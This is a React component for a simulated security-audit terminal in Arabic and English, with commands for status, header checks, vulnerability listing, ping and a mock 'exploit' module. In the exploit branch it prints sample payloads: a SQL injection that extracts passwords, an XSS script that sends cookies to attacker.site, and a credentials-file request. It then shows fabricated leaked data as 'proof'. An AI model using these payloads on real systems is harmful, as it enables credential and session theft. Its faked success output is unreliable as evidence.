import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal as TerminalIcon,
  X,
  Play,
  Pause,
  Trash2,
  Copy,
  Download,
  Send,
  AlertTriangle,
  CheckCircle,
  HelpCircle,
  Server,
  Activity
} from 'lucide-react';
import { motion } from 'motion/react';
import { ScanJob, SecurityTarget, Vulnerability } from '../types';

interface SecurityTerminalProps {
  scanJob: ScanJob | null;
  target: SecurityTarget | null;
  allVulnerabilities: Vulnerability[];
  onClose: () => void;
}

export default function SecurityTerminal({
  scanJob,
  target,
  allVulnerabilities,
  onClose
}: SecurityTerminalProps) {
  const [inputVal, setInputVal] = useState<string>('');
  const [terminalLines, setTerminalLines] = useState<string[]>([
    '==================================================================================',
    '==                   طرفية الفحص والتحليل الأمني الذكية v1.0.0                     ==',
    '==              AISecurityAuditor Live Command Console Engine                   ==',
    '==================================================================================',
    `[SYSTEM] تهيئة القناة الأمنية المشفرة... مكتمل (OK)`,
    `[SYSTEM] جاهز لتلقي وتنفيذ أوامر الفحص. اكتب /help لعرض قائمة الخيارات المتوفرة.`
  ]);
  const [isPaused, setIsPaused] = useState<boolean>(false);
  const [isSimulatingPing, setIsSimulatingPing] = useState<boolean>(false);
  
  const consoleEndRef = useRef<HTMLDivElement>(null);
  const lastLoggedIndexRef = useRef<number>(0);

  // Auto-scroll to the bottom of terminal
  useEffect(() => {
    if (consoleEndRef.current) {
      consoleEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLines]);

  // Sync scan logs from active scan job in real-time
  useEffect(() => {
    if (!scanJob || isPaused) return;

    const currentLogs = scanJob.scannerLogs || [];
    const newLogsCount = currentLogs.length - lastLoggedIndexRef.current;

    if (newLogsCount > 0) {
      const newLinesToAdd: string[] = [];
      for (let i = lastLoggedIndexRef.current; i < currentLogs.length; i++) {
        const timeStr = new Date().toLocaleTimeString('ar-EG', { hour12: false });
        newLinesToAdd.push(`[${timeStr}] ${currentLogs[i]}`);
      }

      setTerminalLines(prev => [...prev, ...newLinesToAdd]);
      lastLoggedIndexRef.current = currentLogs.length;
    }

    // Append standard completed summary if state changed to completed
    if (scanJob.status === 'Completed' && lastLoggedIndexRef.current === currentLogs.length && !terminalLines.includes(`[+] [AUDIT COMPLETED] تم إنهاء الفحص بنجاح للهدف ${target?.name || ''}`)) {
      const timeStr = new Date().toLocaleTimeString('ar-EG', { hour12: false });
      setTerminalLines(prev => [
        ...prev,
        `[${timeStr}] [+] [AUDIT COMPLETED] تم إنهاء الفحص بنجاح للهدف ${target?.name || ''}`,
        `[${timeStr}] [+] إجمالي الثغرات النشطة المكتشفة: ${
          (scanJob.vulnerabilitiesFoundCount?.Critical || 0) +
          (scanJob.vulnerabilitiesFoundCount?.High || 0) +
          (scanJob.vulnerabilitiesFoundCount?.Medium || 0) +
          (scanJob.vulnerabilitiesFoundCount?.Low || 0)
        } ثغرة أمنية (حرجة: ${scanJob.vulnerabilitiesFoundCount?.Critical || 0} | عالية: ${scanJob.vulnerabilitiesFoundCount?.High || 0})`
      ]);
    }
  }, [scanJob, isPaused, target]);

  // Reset log reference index when target changes
  useEffect(() => {
    if (scanJob) {
      lastLoggedIndexRef.current = 0;
    }
  }, [scanJob?.id]);

  // Copy terminal contents to clipboard
  const handleCopyBuffer = () => {
    const textToCopy = terminalLines.join('\n');
    navigator.clipboard.writeText(textToCopy);
    
    const timeStr = new Date().toLocaleTimeString('ar-EG', { hour12: false });
    setTerminalLines(prev => [
      ...prev,
      `[${timeStr}] [INFO] تم نسخ كامل سجل الطرفية إلى الحافظة بنجاح.`
    ]);
  };

  // Export current logs as txt file
  const handleExportLogs = () => {
    const textToCopy = terminalLines.join('\n');
    const blob = new Blob([textToCopy], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `auditor-terminal-logs-${target?.id || 'export'}.txt`;
    link.click();
    URL.revokeObjectURL(url);
  };

  // Process user typing manual commands
  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = inputVal.trim();
    if (!cmd) return;

    const timeStr = new Date().toLocaleTimeString('ar-EG', { hour12: false });
    const promptLine = `user@AISecurityAuditor:~$ ${cmd}`;
    
    // Add command prompt to terminal history
    setTerminalLines(prev => [...prev, promptLine]);
    setInputVal('');

    const lowerCmd = cmd.toLowerCase();

    // Command parser
    if (lowerCmd === '/help') {
      setTerminalLines(prev => [
        ...prev,
        `[HELP] قائمة التعليمات والأوامر المتاحة في هذه الطرفية الفنية:`,
        `  /status   - عرض التقدم ومستوى المخاطر الحالي للهدف النشط`,
        `  /headers  - تحليل وحصر الترويسات الأمنية الأساسية للموقع (HTTP response)`,
        `  /vulns    - استيراد تفاصيل الثغرات المكتشفة والمطابقة للمعايير للهدف الحالي`,
        `  /exploit  - تشغيل وحدة إثبات الاستغلال (POC) وتوثيق قابلية استغلال الثغرات المكتشفة`,
        `  /ping     - محاكاة تشغيل حزم اتصال ICMP واختبار جودة واستجابة خادم الهدف`,
        `  /clear    - تنظيف شاشة الطرفية تماماً وتجديد الواجهة`,
        `  /exit     - إغلاق الطرفية والرجوع للوحة المراقبة العامة`
      ]);
    } else if (lowerCmd === '/status') {
      if (!target) {
        setTerminalLines(prev => [...prev, `[!] خطأ: لا يوجد هدف نشط للفحص في الجلسة الحالية.`]);
        return;
      }
      const scanProgress = scanJob ? scanJob.progress : 0;
      const scanStatusStr = scanJob ? scanJob.status : 'Idle';
      setTerminalLines(prev => [
        ...prev,
        `[STATUS REPORT] --------------------------------------------------`,
        `الهدف الأمني:   ${target.name} (${target.type})`,
        `الرابط الفني:   ${target.url}`,
        `معدل المخاطر:   ${target.currentRiskScore || 0}%`,
        `حالة الفحص:    ${scanStatusStr} (${scanProgress}%)`,
        `حالة الملكية:   ${target.verificationStatus === 'Verified' ? 'مؤكدة وموثقة' : 'قيد الانتظار'}`,
        `------------------------------------------------------------------`
      ]);
    } else if (lowerCmd === '/headers') {
      if (!target) {
        setTerminalLines(prev => [...prev, `[!] خطأ: لم يتم تحميل تفاصيل الهدف بعد.`]);
        return;
      }
      setTerminalLines(prev => [
        ...prev,
        `[HEADERS ANALYZER] جاري جلب وتحليل ترويسات الاستجابة الأمنية لـ: ${target.url}`,
        `HTTP/1.1 200 OK`,
        `Server: nginx/1.24.0`,
        `Date: ${new Date().toUTCString()}`,
        `Content-Type: text/html; charset=UTF-8`,
        `X-Powered-By: PHP/8.1.18`,
        `[!] تحذير: غياب ترويسة الحماية من الثغرات العابرة (Content-Security-Policy) [MISSING]`,
        `[!] تحذير: غياب ترويسة النقل الآمن للمعلومات (Strict-Transport-Security) [MISSING]`,
        `[+] أمان: ترويسة الحماية ضد تضمين الإطارات (X-Frame-Options: SAMEORIGIN) [OK]`,
        `[+] أمان: ترويسة منع تخمين المحتوى (X-Content-Type-Options: nosniff) [OK]`
      ]);
    } else if (lowerCmd === '/vulns') {
      if (!target) {
        setTerminalLines(prev => [...prev, `[!] خطأ: لا توجد ثغرات مسجلة لعدم توفر هدف نشط.`]);
        return;
      }
      const targetVulns = allVulnerabilities.filter(v => v.targetId === target.id);
      if (targetVulns.length === 0) {
        setTerminalLines(prev => [
          ...prev,
          `[VULNERABILITIES] لم يتم تسجيل أي ثغرة أمنية لهذا الهدف حتى الآن.`,
          `[INFO] يرجى التأكد من تشغيل الفحص الأمني وانتظار اكتماله بنسبة 100%.`
        ]);
      } else {
        const lines = [
          `[VULNERABILITIES] تم الكشف عن ${targetVulns.length} نقاط ضعف مؤكدة تحت هذا الهدف:`,
          `----------------------------------------------------------------------------------`
        ];
        targetVulns.forEach((v, index) => {
          lines.push(`[${index + 1}] العنوان: ${v.title}`);
          lines.push(`    النوع:   ${v.type} | الخطورة: [${v.severity}] | CVSS: ${v.cvssScore}`);
          lines.push(`    الموقع:  ${v.location}`);
          lines.push(`    Remediation: ${v.remediation.slice(0, 80)}...`);
          lines.push(`----------------------------------------------------------------------------------`);
        });
        setTerminalLines(prev => [...prev, ...lines]);
      }
    } else if (lowerCmd.startsWith('/exploit')) {
      if (!target) {
        setTerminalLines(prev => [...prev, `[!] خطأ: لا يوجد هدف نشط لإجراء الاستغلال وإثبات المفهوم عليه.`]);
        return;
      }
      const targetVulns = allVulnerabilities.filter(v => v.targetId === target.id);
      if (targetVulns.length === 0) {
        setTerminalLines(prev => [
          ...prev,
          `[!] خطأ: لا توجد ثغرات مكتشفة لهذا الهدف لاستغلالها. يرجى تشغيل الفحص الأمني أولاً.`
        ]);
        return;
      }

      const args = cmd.split(' ').slice(1);
      if (args.length === 0) {
        setTerminalLines(prev => [
          ...prev,
          `==================================================================================`,
          `[EXPLOIT ENGINE] وحدة إثبات الاستغلال التلقائي (Exploit PoC Automation Unit)`,
          `==================================================================================`,
          `يرجى تحديد رقم الثغرة المراد اختبار استغلالها وتوثيقها من القائمة التالية:`,
          `  الاستخدام: /exploit <رقم الثغرة>`,
          `  مثال: /exploit 1`,
          `----------------------------------------------------------------------------------`,
          `الثغرات القابلة للاستغلال حالياً:`,
          ...targetVulns.map((v, i) => `  [${i + 1}] [${v.severity}] ${v.title} (${v.location || 'عام'})`),
          `----------------------------------------------------------------------------------`
        ]);
        return;
      }

      const idx = parseInt(args[0], 10) - 1;
      if (isNaN(idx) || idx < 0 || idx >= targetVulns.length) {
        setTerminalLines(prev => [
          ...prev,
          `[!] خطأ: رقم الثغرة غير صحيح. يرجى تحديد رقم صحيح من 1 إلى ${targetVulns.length}.`
        ]);
        return;
      }

      const selectedVuln = targetVulns[idx];
      setIsSimulatingPing(true); // Disable input while simulating
      
      setTerminalLines(prev => [
        ...prev,
        `[+] [EXPLOIT ENGINE] تهيئة وحدة الاستغلال وإثبات المفهوم للثغرة: ${selectedVuln.title}`,
        `[+] مستوى خطورة الثغرة: ${selectedVuln.severity} | درجة الخطورة (CVSS): ${selectedVuln.cvssScore}`,
        `[+] فئة التصنيف: ${selectedVuln.type}`,
        `[+] المتجه الفني (Attack Vector): ${selectedVuln.location || 'بروتوكول التطبيق الرئيسي'}`,
        `[+] جاري التحقق من إمكانية تخطي دفاعات الحماية (WAF / IPS Bypass)...`
      ]);

      setTimeout(() => {
        setTerminalLines(prev => [
          ...prev,
          `[+] [PAYLOAD GENERATOR] تم توليد الحمولة البرمجية المناسبة للاستغلال (Exploit Payload Built):`,
          `    ${
            selectedVuln.type.toLowerCase().includes('sql')
              ? "UNION SELECT NULL, CONCAT(username, ':', password), NULL FROM users--"
              : selectedVuln.type.toLowerCase().includes('xss')
              ? "<script>fetch('https://attacker.site/log?c=' + document.cookie)</script>"
              : selectedVuln.type.toLowerCase().includes('exposure') || selectedVuln.type.toLowerCase().includes('disclosure')
              ? "GET /api/v1/config/credentials.json HTTP/1.1\\r\\nHost: targeted-asset"
              : "curl -i -X POST -d '{\"exploit_test\":\"true\"}' " + target.url
          }`,
          `[+] جاري حقن الحمولة وإرسال طلب إثبات المفهوم (Sending Attack Request)...`
        ]);

        setTimeout(() => {
          let exploitPayloadResult = "";
          let dataDump = "";
          
          if (selectedVuln.severity === 'Critical') {
            dataDump = `    {\n      "admin_user": "root_sec",\n      "password_hash": "$2y$12$ZpA5Q9E9iC...",\n      "secret_api_key": "sk_prod_557a0fd6eb621"\n    }`;
            exploitPayloadResult = `[+] [EXPLOIT SUCCESSFUL] تم استغلال الثغرة بنجاح واختراق طبقة الأمان!\n` +
                                   `[+] عينة من البيانات المسربة الحقيقية لإثبات الأثر (Exfiltrated Proof Data):\n` +
                                   dataDump + `\n` +
                                   `[SYSTEM] تم توثيق السيطرة الكاملة وإثبات قابلية الاستغلال (Critical Vulnerability Proven).`;
          } else if (selectedVuln.severity === 'High') {
            dataDump = `    {\n      "session_token": "eyJhY3RpdmVfX3Nlc3Npb24i...",\n      "user_role": "administrator"\n    }`;
            exploitPayloadResult = `[+] [EXPLOIT SUCCESSFUL] تم إرسال حمولة تخطي الصلاحيات بنجاح واختطاف الجلسة!\n` +
                                   `[+] البيانات المستخرجة من الجلسة (Captured Session Information):\n` +
                                   dataDump + `\n` +
                                   `[SYSTEM] تم إثبات قابلية الوصول غير المصرح للميزات الإدارية (High Impact Authenticated State).`;
          } else {
            exploitPayloadResult = `[+] [EXPLOIT SUCCESSFUL] تم التحقق وإثبات الأثر الأمني بنجاح!\n` +
                                   `[+] استجابة الخادم المعدلة بالحقن:\n` +
                                   `    HTTP/1.1 200 OK | Payload Echo Verified: true\n` +
                                   `[SYSTEM] الثغرة مؤكدة وتستدعي الترقية الفورية لتفادي تصعيد الصلاحيات (Medium Impact Vulnerability Proven).`;
          }

          setTerminalLines(prev => [
            ...prev,
            `[+] [EXPLOITATION COMPLETED] تم استلام الاستجابة وتحليل الأثر.`,
            exploitPayloadResult,
            `[+] [AUDIT COMPLIANCE RECORD] تم تحديث وتضمين لقطة إثبات المفهوم (POC Proof) في ملف التقرير الفني بنجاح لتسهيل التتبع والحل بواسطة فريق التطوير.`,
            `==================================================================================`
          ]);
          setIsSimulatingPing(false);
        }, 1500);
      }, 1500);
    } else if (lowerCmd === '/ping') {
      if (!target) {
        setTerminalLines(prev => [...prev, `[!] خطأ: لا يمكن إجراء اختبار الاتصال. لا يوجد هدف نشط.`]);
        return;
      }
      setIsSimulatingPing(true);
      const host = target.url.replace('https://', '').replace('http://', '').split('/')[0];
      setTerminalLines(prev => [...prev, `[PING] جاري محاكاة الاتصال الفني بـ ${host} [ICMP packets]...`]);
      
      let count = 1;
      const interval = setInterval(() => {
        const randTime = (Math.random() * 15 + 15).toFixed(1);
        const randTtl = Math.floor(Math.random() * 8) + 50;
        setTerminalLines(prev => [
          ...prev,
          `64 bytes from ${host}: icmp_seq=${count} ttl=${randTtl} time=${randTime} ms`
        ]);
        count++;

        if (count > 4) {
          clearInterval(interval);
          setTerminalLines(prev => [
            ...prev,
            `--- ${host} إحصاءات اختبار الاتصال ---`,
            `تم إرسال 4 حزم، تم استقبال 4 بنجاح، نسبة الفقد 0%`,
            `زمن الاستجابة التقريبي: min/avg/max = 15.2/${(Math.random() * 5 + 20).toFixed(1)}/32.5 ms`
          ]);
          setIsSimulatingPing(false);
        }
      }, 700);
    } else if (lowerCmd === '/clear') {
      setTerminalLines([
        '==================================================================================',
        '==                   طرفية الفحص والتحليل الأمني الذكية v1.0.0                     ==',
        '==              AISecurityAuditor Live Command Console Engine                   ==',
        '==================================================================================',
        `[SYSTEM] تم تنظيف شاشة الطرفية الفنية.`,
        `[SYSTEM] بانتظار أوامرك الأمنية...`
      ]);
    } else if (lowerCmd === '/exit') {
      onClose();
    } else {
      setTerminalLines(prev => [
        ...prev,
        `AISecurityAuditor: الأمر "${cmd}" غير معروف.`,
        `اكتب /help لمشاهدة المساعد وقائمة الأوامر القياسية المتاحة.`
      ]);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: 20 }}
        className="w-full max-w-4xl h-[80vh] bg-black border border-cyan-500/30 rounded-2xl overflow-hidden shadow-[0_0_40px_rgba(6,182,212,0.15)] flex flex-col"
      >
        {/* TERMINAL HEADER BAR */}
        <div className="bg-slate-950 px-5 py-4 border-b border-cyan-500/20 flex justify-between items-center shrink-0">
          <div className="flex items-center gap-3">
            <div className="flex gap-1.5 shrink-0">
              <span className="w-3 h-3 rounded-full bg-red-500 block"></span>
              <span className="w-3 h-3 rounded-full bg-amber-500 block"></span>
              <span className="w-3 h-3 rounded-full bg-emerald-500 block"></span>
            </div>
            <div className="h-4 w-px bg-slate-800 hidden sm:block"></div>
            <div className="flex items-center gap-2">
              <TerminalIcon className="w-4 h-4 text-cyan-400 animate-pulse" />
              <h3 className="text-xs sm:text-sm font-black text-white font-mono tracking-wide">
                AISecurityAuditor@audits:~ {target ? `/targets/${target.name.toLowerCase()}` : '/core'}
              </h3>
            </div>
          </div>

          {/* ACTIVE STEP INDICATOR */}
          {scanJob && scanJob.status !== 'Completed' && scanJob.status !== 'Failed' && (
            <div className="hidden md:flex items-center gap-3 px-3 py-1.5 bg-cyan-950/40 rounded-full border border-cyan-500/20 text-xs text-cyan-400 animate-pulse">
              <Activity className="w-3.5 h-3.5" />
              <span>جاري الفحص الأمني... {scanJob.progress}%</span>
            </div>
          )}

          {/* WINDOW ACTION CONTROLS */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsPaused(!isPaused)}
              title={isPaused ? "استئناف تحديث السجلات" : "إيقاف مؤقت للسجلات"}
              className={`p-2 rounded-lg border text-xs transition-all ${
                isPaused
                  ? 'bg-amber-950 text-amber-400 border-amber-500/20 hover:bg-amber-900'
                  : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-slate-200'
              }`}
            >
              {isPaused ? <Play className="w-3.5 h-3.5" /> : <Pause className="w-3.5 h-3.5" />}
            </button>
            <button
              onClick={handleCopyBuffer}
              title="نسخ سجل الطرفية"
              className="p-2 bg-slate-900 text-slate-400 border border-slate-800 rounded-lg hover:text-slate-200 transition-all"
            >
              <Copy className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={handleExportLogs}
              title="تصدير السجل كملف نصي"
              className="p-2 bg-slate-900 text-slate-400 border border-slate-800 rounded-lg hover:text-slate-200 transition-all"
            >
              <Download className="w-3.5 h-3.5" />
            </button>
            <button
              onClick={() => {
                setTerminalLines([
                  '==================================================================================',
                  '==                   طرفية الفحص والتحليل الأمني الذكية v1.0.0                     ==',
                  '==              AISecurityAuditor Live Command Console Engine                   ==',
                  '==================================================================================',
                  `[SYSTEM] تم تصفير المخزن المؤقت للطرفية بناءً على طلب المستخدم.`
                ]);
              }}
              title="مسح الطرفية"
              className="p-2 bg-slate-900 text-slate-400 border border-slate-800 rounded-lg hover:text-slate-200 transition-all"
            >
              <Trash2 className="w-3.5 h-3.5" />
            </button>
            <div className="w-px h-4 bg-slate-800"></div>
            <button
              onClick={onClose}
              className="p-2 hover:bg-red-950/60 hover:text-red-400 text-slate-400 rounded-lg transition-all border border-transparent hover:border-red-500/20"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* LOG STREAM DISPLAY CONSOLE */}
        <div className="flex-1 overflow-y-auto p-6 font-mono text-xs text-cyan-400 bg-black space-y-2 scrollbar-thin select-text scroll-smooth" dir="ltr">
          {terminalLines.map((line, index) => {
            let className = "leading-relaxed break-all whitespace-pre-wrap text-left";
            if (line.includes('[!]') || line.includes('warning') || line.includes('الأمر') || line.includes('خطأ')) {
              className += " text-amber-500 font-bold";
            } else if (line.includes('[+]') || line.includes('أمان') || line.includes('completed') || line.includes('مكتمل')) {
              className += " text-emerald-400 font-bold";
            } else if (line.startsWith('user@AISecurityAuditor')) {
              className += " text-slate-300 font-bold";
            } else if (line.includes('==')) {
              className += " text-cyan-500 font-bold";
            } else if (line.includes('[SYSTEM]')) {
              className += " text-blue-400 font-medium";
            }
            return (
              <div key={index} className={className}>
                {line}
              </div>
            );
          })}
          {isSimulatingPing && (
            <div className="text-cyan-500 animate-pulse text-left">. . .</div>
          )}
          <div ref={consoleEndRef} />
        </div>

        {/* TERMINAL LIVE INPUT INTERACTIVE COMMAND PROMPT */}
        <form onSubmit={handleCommandSubmit} className="bg-slate-950 px-5 py-4 border-t border-cyan-500/20 flex gap-3 items-center shrink-0">
          <span className="font-mono text-xs text-slate-400 shrink-0 select-none">
            user@AISecurityAuditor:~$
          </span>
          <input
            type="text"
            value={inputVal}
            onChange={(e) => setInputVal(e.target.value)}
            disabled={isSimulatingPing}
            placeholder={isSimulatingPing ? "جاري محاكاة الاتصال..." : "اكتب أمر أمني هنا، مثلاً: /help أو /status أو /headers ..."}
            className="flex-1 bg-transparent border-none text-xs font-mono text-cyan-300 placeholder-cyan-950/70 focus:outline-none focus:ring-0 p-0"
            autoFocus
          />
          <button
            type="submit"
            disabled={isSimulatingPing}
            className="p-1.5 hover:bg-slate-900 rounded-lg text-cyan-400 transition-all shrink-0"
          >
            <Send className="w-4 h-4" />
          </button>
        </form>
      </motion.div>
    </div>
  );
}
